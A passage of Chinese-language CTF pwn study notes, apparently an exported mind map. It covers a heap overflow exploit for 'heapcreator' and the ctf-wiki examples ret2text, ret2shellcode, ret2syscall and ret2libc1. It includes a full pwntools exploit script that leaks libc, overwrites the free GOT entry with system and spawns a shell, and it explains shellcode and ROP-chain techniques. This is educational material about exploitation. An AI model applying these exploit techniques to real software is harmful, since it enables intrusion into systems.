<a name="0ec16ocav9otk7v2fu6r9airuk">&nbsp;&nbsp;create(0x70,payload)执行第二次溢出，将下一个（下标为2）block对应的size字段和context指针，分别修改为0x8和free_get</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/45bss96gfub4l06mo86lrcpar0.png"></p>
<h3 class="topic">
<a name="2b9a12ba00n54siat7l4fel399">&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2cvbp9pdbauurh4391oh1sstli.png"></p>
<h3 class="topic">
<a name="4oo3578dcr5botg318kbmmm3bn">&nbsp;&nbsp;&nbsp;&nbsp;经过验证 free函数的got表项的地址的确为0x602018</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0u48n5j52p6lu5r3eimh7k34nl.png"></p>
<h3 class="topic">
<a name="1659fejkje0eb8de78t1l7fg86">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过验证GOT对应表项中取出的的确是free函数的地址</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7gqe6mbafn6jtmoamec6e24omi.png"></p>
<h3 class="topic">
<a name="77uu0aok4q6hnk1l8ijegvo2qk">&nbsp;&nbsp;成功将free对应got表项的内容填充为system函数的地址</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/1qe1cu6hbh40bhl41r8nkha42q.png"></p>
<h3 class="topic">
<a name="1d0e5djn201d5av058aka5sgqi">&nbsp;&nbsp;最终执行delete(3) 相当于执行system('/bin/sh')</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/53ih9btlj4an7fn44t5k26h6dj.png"></p>
<h3 class="topic">
<a name="7hqpdkvc6nl1d28fpgj69kh29e">&nbsp;exp</a>
</h3>
<h3 class="topic">
<a name="07jqq28d99cbolc8luc6hi0os9">&nbsp;&nbsp;from pwn import *&#13;
sh = process('./heapcreator.txt')&#13;
elf = ELF('./heapcreator.txt')&#13;
libc = ELF('./libc.so.6')&#13;
&#13;
context.log_level='debug'&#13;
if args.G:&#13;
	gdb.attach(sh)&#13;
&#13;
def create(size, value) :&#13;
    sh.recvuntil('Your choice :')&#13;
    sh.sendline('1')&#13;
    sh.recvuntil('Size of Heap :')&#13;
    sh.sendline(str(size))&#13;
    sh.recvuntil('Content of heap:')&#13;
    sh.sendline(value)&#13;
&#13;
def edit(idx, value) :&#13;
    sh.recvuntil('Your choice :')&#13;
    sh.sendline('2')&#13;
    sh.recvuntil('Index :')&#13;
    sh.sendline(str(idx))&#13;
    sh.recvuntil('Content of heap : ')&#13;
    sh.sendline(value)&#13;
&#13;
def show(idx) :&#13;
    sh.recvuntil('Your choice :')&#13;
    sh.sendline('3')&#13;
    sh.recvuntil('Index :')&#13;
    sh.sendline(str(idx))&#13;
&#13;
def delete(idx) :&#13;
    sh.recvuntil('Your choice :')&#13;
    sh.sendline('4')&#13;
    sh.recvuntil('Index :')&#13;
    sh.sendline(str(idx))&#13;
&#13;
free_got = elf.got['free']&#13;
create(0x18,'aaaaaaa')&#13;
create(0x10, 'aaaaaaa')&#13;
create(0x10, 'aaaaaaa')&#13;
create(0x10, '/bin/sh\x00')&#13;
payload = 'a' * 0x18 + '\x81'&#13;
edit(0, payload)&#13;
delete(1)&#13;
size = '\x08'.ljust(8, '\x00')&#13;
payload = 'b' * 0x40 + size + p64(free_got)&#13;
create(0x70, payload)&#13;
show(2)&#13;
sh.recvuntil('Content :')&#13;
free_adr = u64(sh.recvline()[:-1].strip().ljust(8, '\x00'))&#13;
print 'free_adr: ' + hex(free_adr)&#13;
libc_base = free_adr - libc.symbols['free']&#13;
system_adr = libc_base + libc.symbols['system']&#13;
print 'libc_base: ' + hex(libc_base)&#13;
print 'system_adr: ' + hex(system_adr)&#13;
edit(2, p64(system_adr))&#13;
delete(3)&#13;
sh.interactive()</a>
</h3>
<h2 class="topic">
<a name="605oaa7mac26bmttsvls23mjbd">pwn_by_example_1_ret2text</a>
</h2>
<h3 class="topic">
<a name="2p8o7tpu7pvktdo4u01j75nkc7">&nbsp;视频系列教程中的例子均是来源于ctf-wiki</a>
</h3>
<h3 class="topic">
<a name="1j4vdq0b19g6aupm8u6c8do8j6">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/41qrgopkdlqr87tvk155k7s242.png"></p>
<h3 class="topic">
<a name="61gcftot3l5s0j7o6jcqhvd008">&nbsp;做题流程</a>
</h3>
<h3 class="topic">
<a name="730or7crg9psnkhlc60f1rq9kk">&nbsp;&nbsp;查看文件类型和文件保护措施</a>
</h3>
<h3 class="topic">
<a name="7t7d51ljl4dtvpboqhvq8rgf4q">&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2t7fg2724k9b1hkmrb3u7p5kdp.png"></p>
<h3 class="topic">
<a name="0hg18vflotnevg4h2eojp6ljjf">&nbsp;&nbsp;&nbsp;&nbsp;注意本题开启了nx，并且是一个32位的动态链接程序</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4ijol7uurs7bn0ums81au0aut4.png"></p>
<h3 class="topic">
<a name="30bqef0q3ue2ha9ms561q5qu16">&nbsp;&nbsp;运行程序分析功能</a>
</h3>
<h3 class="topic">
<a name="29pauu6vvjlk6dj4g0qqqi14i2">&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/45o7jus84ddnu5jsldepo9e8h8.png"></p>
<h3 class="topic">
<a name="7a33ab19h663vmkp1er9efrc9o">&nbsp;&nbsp;&nbsp;&nbsp;程序只有一个输入点，可以通过ida检查输入点的处理程序</a>
</h3>
<h3 class="topic">
<a name="593vin64nddoqgk2c0b9fh7qon">&nbsp;&nbsp;ida分析程序</a>
</h3>
<h3 class="topic">
<a name="63vu0hrusjnp7ggh8ksnjvebrs">&nbsp;&nbsp;&nbsp;很明显，gets()存在栈溢出</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/21crk5qputs5h5oqgaetf6c69c.png"></p>
<h3 class="topic">
<a name="1ec7pbke87r4c8chgp8998ti3r">&nbsp;&nbsp;使用cyclic生成的不规则字符串，确定函数返回地址的偏移</a>
</h3>
<h3 class="topic">
<a name="4ldmmffqf5q3mn16olu2k55dsn">&nbsp;&nbsp;&nbsp;注意生成不规则字符串后，复制，然后gdb 文件名，直接输入run，程序开始运行，将不规则字符串作为参数传递给程序进行溢出</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/1okqnq2gnm8gfvaiittgj69roi.png"></p>
<h3 class="topic">
<a name="2s6ev0dui6kpa7b6e9e70sgqic">&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/529c33gmkb0jhnsud0sptr7qvb.png"></p>
<h3 class="topic">
<a name="0hltapq3jdnce7cccl5ajo040i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4ikhq6nmir03c5neogieu9tj4p.png"></p>
<h3 class="topic">
<a name="754vp10j0o52i5a6g7ntmu85bq">&nbsp;&nbsp;通过gedit 2.py开始写exp</a>
</h3>
<h3 class="topic">
<a name="6vb6678br79lcj15hvefhipo9e">&nbsp;&nbsp;&nbsp;因为开启了nx，所以程序不能在堆或栈中执行代码，需要查看目前程序有哪些功能</a>
</h3>
<h3 class="topic">
<a name="7ophsnc6di8isilv7emn4odmf5">&nbsp;&nbsp;&nbsp;&nbsp;查看got表发现程序中有system()</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2bknjt5ifff8eetis0vqp5fimo.png"></p>
<h3 class="topic">
<a name="180kp7pc8derc7fi8jdhbc867g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在ida中查到调用system()函数的地址，该地址覆盖到返回地址，即可获得shell</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3mr8csln7tbgtl8f37830t583g.png"></p>
<h3 class="topic">
<a name="3s725nnkot92j40kp3f4iuq25j">&nbsp;&nbsp;exp</a>
</h3>
<h3 class="topic">
<a name="4v5lfke8jqdmprfp2mjvvtc12g">&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2odsq27sfmg8mos1i1fsf5imp1.png"></p>
<h3 class="topic">
<a name="77s2l9m4dh68gjooegcmrejs2l">&nbsp;&nbsp;ret2text</a>
</h3>
<h3 class="topic">
<a name="0ditbbgmia14nknu3tth1guf66">&nbsp;&nbsp;&nbsp;本例中因为没有开启PIE，所以程序个模块的基地址固定的，所以即使程序是动态链接的，也可以直接使用system("/bin/sh")调用的地址覆盖函数返回地址</a>
</h3>
<h2 class="topic">
<a name="4hti8d7bl7gr8b2jogk5iaadm1">pwn_by_example_2_ret2shellcode</a>
</h2>
<h3 class="topic">
<a name="3i2e4opismjd98aokunjm92b3m">&nbsp;分析程序性质和程序执行过程</a>
</h3>
<h3 class="topic">
<a name="1r625ihi94enje0i82g5ina8ta">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/51mc91at8oi1tiigfkqpi48bur.png"></p>
<h3 class="topic">
<a name="6nnqfus6jti0ic2gb4gb14lqho">&nbsp;只有一个输入，通过ida分析程序</a>
</h3>
<h3 class="topic">
<a name="6fdquqrkdes9ha82foapebr98q">&nbsp;&nbsp;gets()存在栈溢出</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/5hpg65r7dpg2mirn36cbabem42.png"></p>
<h3 class="topic">
<a name="44ljb8ro0mfv5aetn356n2pskt">&nbsp;为了确定使用什么内容覆盖返回地址，分析程序中有的功能</a>
</h3>
<h3 class="topic">
<a name="2hhvt8udlbjjv1akiq25uju1c7">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0rv5lvio91bjd540vkspdrgv85.png"></p>
<h3 class="topic">
<a name="3fu87paptm9it4e21knnbtmhhu">&nbsp;利用思路</a>
</h3>
<h3 class="topic">
<a name="6pfqvn9tdk36ebqec1guaqeb2u">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/1ookgh1a04jev4f1fci4e5ial8.png"></p>
<h3 class="topic">
<a name="0855cl3b5o8sv5e68a29rc0nkg">&nbsp;&nbsp;&nbsp;注意即使操作系统默认开启了ASLR，堆、栈、libc地址会随机化，bss段没有随机化</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2rp1491vhpia0ehrt2mm4kl8ci.png"></p>
<h3 class="topic">
<a name="2j636cig1h99chfo29i5gn3kg6">&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/11842ni79sl96ai613ibr85ukn.png"></p>
<h3 class="topic">
<a name="0oarbe3hvvetsqcdv3dlibpkii">&nbsp;&nbsp;因为程序中没有现成的系统调用，并且关闭了NX，所以需要通过在输入的字符中包含shellcode，然后执行strncpy函数将输入数据的前0x64字节保存到bss段中的buf2中，这部分数据就是shellcode，通过输入数据将函数返回地址覆盖为buf2首地址，函数返回后，shellcode被执行</a>
</h3>
<h3 class="topic">
<a name="5a34rsdcitfhp8ej8t79d1bng0">&nbsp;&nbsp;&nbsp;为了gets()执行完毕后还能执行strncpy(),溢出覆盖的返回地址一定不能是gets()函数的返回地址，可以是strcpy() printf() 或main函数的返回地址，确定溢出那个返回地址由工具cyclic计算的返回地址偏移决定的</a>
</h3>
<h3 class="topic">
<a name="1eo2l0kiaqj69p8245f7g7f306">&nbsp;&nbsp;&nbsp;&nbsp;实际漏洞利用过程中，我们发现最后bye bye~字符串被打印出来之后，shellcode被执行，所以覆盖的返回地址可能是printf()或main函数的</a>
</h3>
<h3 class="topic">
<a name="70qsdhes23bdqf8bi0bht25ada">&nbsp;exp编写</a>
</h3>
<h3 class="topic">
<a name="0t19lug7al6cul6trkuo9rq8fj">&nbsp;&nbsp;使用cyclic确定返回地址的偏移，也可以手动计算</a>
</h3>
<h3 class="topic">
<a name="0u6rg5vjg7qm6jr0v4bjqiv2i7">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7eovgp2v2c3iet5blo0hp12lfb.png"></p>
<h3 class="topic">
<a name="4p53o5tu9904e2p4v7sm5smquu">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/476kcaeftnkdkckvqb13k9hbqj.png"></p>
<h3 class="topic">
<a name="68vooa5f9etcnnegf752u7rj64">&nbsp;&nbsp;&nbsp;注意asm()如果要使用，需要有指定此时程序的上下文状态（通过context.binary）</a>
</h3>
<h3 class="topic">
<a name="1jjrq3fgjaej6uj7o7km3h23vg">&nbsp;利用结果</a>
</h3>
<h3 class="topic">
<a name="7tcbfi14djdkl337fa7fn2q2jp">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2tbasq3r6325488d4rm4bmdgbc.png"></p>
<h3 class="topic">
<a name="13uukqqjq0lcjjns9hl3nhu2ia">&nbsp;ret2shell</a>
</h3>
<h3 class="topic">
<a name="1735b0c888qfj6nuicc1etdnh8">&nbsp;&nbsp;程序没有开启任何保护措施，但是程序中没有system()扽函数，所以需要将shellcode通过输入保存到栈、堆中，然后执行</a>
</h3>
<h3 class="topic">
<a name="2k9ur4jmrbrisfm6dt1vgfjfbd">&nbsp;&nbsp;&nbsp;注意可以有这种pwntools用法，可以生成一段字符串，该字符串开头为shellcode，后面使用字符进行占位，如果shellcode不满112字节，则使用a进行占位</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/62eap1nhi4a2pss3hgnd9sutj2.png"></p>
<h2 class="topic">
<a name="053usnla7796lgnsi7t5ln6a33">pwn_by_example_3_ret2syscall</a>
</h2>
<h3 class="topic">
<a name="30cvlf6f6d682j9g77gcpfk6l0">&nbsp;漏洞程序源码，与之前的一个程序一样，被溢出的函数返回地址的偏移为112个字节</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/40ul4cisv413cmknfnhboutnmd.png"></p>
<h3 class="topic">
<a name="5jo2k7c17vh3b5qs2jijah34hr">&nbsp;程序信息查看和程序运行</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/25ts03hf1mcl5dg9a38t6f4bl6.png"></p>
<h3 class="topic">
<a name="2jtil7eik46j5bsiark6m3rq04">&nbsp;在gdb中使用vmmp查看程序段信息</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/6dh2pu5m36of19h5apjs5jtdsk.png"></p>
<h3 class="topic">
<a name="4vgd8c693bk9tpev57q2d2spi6">&nbsp;ROPgadget工具的使用</a>
</h3>
<h3 class="topic">
<a name="155vfhccnloiso66enntkncmme">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/6l5o68cvvkn5sp6pfmi9q6pljf.png"></p>
<h3 class="topic">
<a name="011i8k8qil74977e112jghbma5">&nbsp;&nbsp;&nbsp;引入工具ROPgadget使用</a>
</h3>
<h3 class="topic">
<a name="6aiabclrdp8r3280k1srfolgvu">&nbsp;&nbsp;&nbsp;注意指令中的rop是可执行文件名</a>
</h3>
<h3 class="topic">
<a name="6otcnmjiqttte4ld6bf55g35ba">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7baee566o98romec43nfn8h75h.png"></p>
<h3 class="topic">
<a name="2isdc0ool26ai6a5vt6n54hhm8">&nbsp;exp编写</a>
</h3>
<h3 class="topic">
<a name="0id204u5vcl55lhfhg6a5skq5j">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2lo3tas805qaukd29jfkeh7747.png"></p>
<h3 class="topic">
<a name="3o5al551b6tje7luks28862i89">&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7hrkuue2tj00fuhpo907fc4mro.png"></p>
<h3 class="topic">
<a name="6s4g4jv6rr5oi07kjbil85hrsd">&nbsp;主要思路</a>
</h3>
<h3 class="topic">
<a name="5b35scsmah1q0qdd6i7rb99ttf">&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/20a5ac5ns78higvcsb8cmhlc64.png"></p>
<h3 class="topic">
<a name="6srddf9uesldp0gr4mu2fq785e">&nbsp;ret2syscall</a>
</h3>
<h3 class="topic">
<a name="6m8na1rli9hf7h4pr6pa5ps2ee">&nbsp;&nbsp;程序没有开启pie，所以程序各个模块的基址都是固定的，所以此时无论是动态链接还是静态链接，都可以使用模块(主模块或共享库)中现有的地址，</a>
</h3>
<h3 class="topic">
<a name="70ake9akrblqarss638t563cbu">&nbsp;&nbsp;&nbsp;但是此时和ret2text区别在于，ret2text中GOT表中存在system()函数可以直接调用，但那时本例中GOT表中没有system()，所以此时就需要自己构造ROP链，此时本例静态链接的特点有用了，静态链接说明可执行文件中包含所有程序所需的指令，从而可以直接将可执行文件作为目标，使用ROPgadget工具构造rop链，而不需要其他模块参与rop链的构造，&#13;
即ROPgadget --binary 可执行文件名 --ropchain</a>
</h3>
<h3 class="topic">
<a name="2r9bm3s8brsbdmfrs3mepold20">&nbsp;注意linux中系统调用的方式有三种</a>
</h3>
<h3 class="topic">
<a name="1mduepj6s0r23j8r9mjfin8923">&nbsp;&nbsp;int 0x80</a>
</h3>
<h3 class="topic">
<a name="67jsm5q13q3s7ufcq82gurshko">&nbsp;&nbsp;&nbsp;最传统的系统调用方式，速度较慢，下面两种都是快速系统调用方式</a>
</h3>
<h3 class="topic">
<a name="50oraotpl38bcdc88tuat1a32l">&nbsp;&nbsp;sysenter</a>
</h3>
<h3 class="topic">
<a name="7sde1blhqhqfcqipicsavnpgkd">&nbsp;&nbsp;&nbsp;intel32位架构中使用</a>
</h3>
<h3 class="topic">
<a name="14nokchfioj54m5n3j3iusb6gs">&nbsp;&nbsp;syscall</a>
</h3>
<h3 class="topic">
<a name="0j7hk5gi0fot9q5r51p8oskumd">&nbsp;&nbsp;&nbsp;intel64位架构、AMD32位架构、AMD64位架构使用</a>
</h3>
<h3 class="topic">
<a name="2sspppsmvmpgai81md6n8onq7q">&nbsp;&nbsp;其中int 0x80的原理被运用于ret2syscall的漏洞利用方式中，即在内存中寻找int 0x80指令的地址，然后通过搜搜gadget构造int 0x80的参数传递</a>
</h3>
<h3 class="topic">
<a name="2b3bq27eqviomotpk5dk0rbq8r">&nbsp;&nbsp;所以除了int 0x80，也有其他的系统调用方式可以被ret2syscall进行漏洞利用</a>
</h3>
<h3 class="topic">
<a name="2bfe4033d5n5g6gf6ubm5ioth0">&nbsp;&nbsp;https://cloud.tencent.com/developer/article/1492374</a>
</h3>
<h2 class="topic">
<a name="0q10fi307ga4nr5fe3e04lsea4">pwn_by_example_4_ret2libc1</a>
</h2>
<h3 class="topic">
<a name="7np100c1gi07rjn260to3ugbun">&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/344edlu8dc85pgalbou7f555pe.png"></p>
<h3 class="topic">
<a name="0adire8jnvc6js9a089r71di7u">&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/035ttips5485lrstke9liabue5.png"></p>
<h3 class="topic">
<a name="7l7da8or2h0kog7dsr0h3hetma">&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0q9vjjtlg8k12g13ja41gn5irh.png"></p>
<h3 class="topic">
<a name="5e23ma1hst8i2ktf5hphq9p7nm">&nbsp;使用gdb在程序中搜索是否存在&ldquo;/bin/sh&rdquo;字符串 ，根据搜索结果发现"/bin/sh"位于可执行文件ret2libc1中存在</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2m9vr7rvsvsk7n4c26q8spvf69.png"></p>
<h3 class="topic">
<a name="6970a2qq2nb6ilqlb35u14jvkl">&nbsp;&nbsp;如果使用gef插件，也可以通过search搜索字符串</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4uf1b0reucpudetgkt5pelbr6u.png"></p>
<h3 class="topic">
<a name="5oa2l7fd3hlf8hja1u8jbqqe2f">&nbsp;&nbsp;&nbsp;也可以通过ROPgadget搜索字符串</a>
</h3>
<h3 class="topic">
<a name="0nlmr7fjk9lv54hp6vq9g1o2eu">&nbsp;p32 和u32主要是在32位小端法的字符串和数字之间进行转换 &#13;
p32可以将十六进制小端存放的数字转换为shellcode形式的字符串</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/71ntrmav4sqp71u69n6iuroc2c.png"></p>
<h3 class="topic">
<a name="21u68cfmekkm9s71b6lkgo5hu0">&nbsp;exp内容</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7vpfdpa727sv471lfmm8a1hl1f.png"></p>
<h3 class="topic">
<a name="2e0hq8bi4797h1bnnm6bp5aebq">&nbsp;主要思路</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7bgoadqq374a6lg0svnlgqa7fm.png"></p>
<h3 class="topic">
<a name="6v693sgjibt17u6r3ui97am5sg">&nbsp;&nbsp;关于作者描述的&ldquo;plt中存放的是代码，got中存放的是数据&rdquo;这里的描述有所偏差，当可执行程序动态链接时，会同时存在GOT表和PLT表，而GOT表是最后保存重定位目标地址的表，根据plt表，got表会被分为 got.plt 和got表，前者保存重定位函数的地址，后者保存重定位数据的地址</a>
</h3>
<h3 class="topic">
<a name="2cq8u0rvs4l2ogsk3taccjvplj">&nbsp;ret2libc1</a>
</h3>
<h3 class="topic">
<a name="08nd8a1vdc9t7lqlc6dfollq1u">&nbsp;&nbsp;本例中程序没有开启pie，并且程序中存在system()函数，但是与ret2text例题不同的是，现存的system()函数额参数不符合要求，所以本例中需要搜索参数相关字符串是否存在</a>
</h3>
<h3 class="topic">
<a name="2su42cbq2m2bp4rrl4vjpveuk5">&nbsp;&nbsp;&nbsp;本例中exp中的亮点是使用了ELF对象&#13;
elf=ELF('./ret2libc')&#13;
然后通过elf对象获得可执行文件中system函数的地址&#13;
p32(elf.plt['system'])&#13;
按理说，所有关闭了pie的动态链接的可执行文件均可以使用这种方法获得plt表中的函数的地址</a>
</h3>
</body>
</html>
